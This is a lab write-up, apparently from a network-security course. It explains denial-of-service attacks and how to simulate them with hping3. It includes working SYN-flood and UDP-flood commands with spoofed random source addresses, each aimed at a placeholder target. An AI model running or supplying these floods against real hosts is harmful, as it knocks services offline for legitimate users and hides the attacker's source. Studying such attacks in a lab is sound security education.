Experiment No. 05
Aim:
To simulate a DoS attack using HPING3 and other tools.

Software Required:

Ubuntu 14.04 OS
Wireshark 2.6.1
Theory:
A Denial-of-Service (DoS) attack aims to make a network resource unavailable by overwhelming it with traffic. A Distributed DoS (DDoS) attack involves multiple sources. These attacks often target high-profile services like banks or web servers, causing them to become unresponsive. DoS attacks are also sometimes used in games or as digital protests.

A common DoS method saturates the target with excessive communication requests, leading to overload, which either crashes or slows down the system, rendering it unavailable for legitimate users. DoS attacks are violations of Internet use policies and often illegal.

HPING3 Overview:
HPING3 is a packet generator and analyzer for the TCP/IP protocol, widely used for security auditing, firewall testing, and network analysis. It can be used for traceroutes, firewall testing, and DoS attacks.

Steps for Simulating a DoS Attack using HPING3:
Install HPING3:

bash
Copy code
sudo apt-get install hping3
Basic HPING3 Command Syntax for DoS:

bash
Copy code
hping3 -c <packet_count> -d <packet_size> -S -w <window_size> -p <target_port> --flood --rand-source <target_IP/website>
-c 100000: Number of packets to send.
-d 120: Packet size.
-S: Send SYN packets.
-w 64: TCP window size.
-p 21: Target port (e.g., FTP port 21).
--flood: Flood mode to send packets as fast as possible.
--rand-source: Randomize source IP addresses.
<target_IP/website>: Target IP or website.
SYN Flood DoS Attack Example:

bash
Copy code
hping3 --flood -S -p 80 --rand-source <target_IP>
Sends SYN requests to the target on port 80 (HTTP), overwhelming the server.
UDP Flood Attack Example:

bash
Copy code
hping3 --flood -2 -p 6234 --rand-source <target_IP>
Sends UDP flood packets to target port 6234 from a fake IP.
Conclusion:
The experiment demonstrates how to simulate a DoS attack using HPING3. By sending an overwhelming number of SYN or UDP packets to a target, the machine becomes unresponsive, effectively simulating a denial-of-service attack.
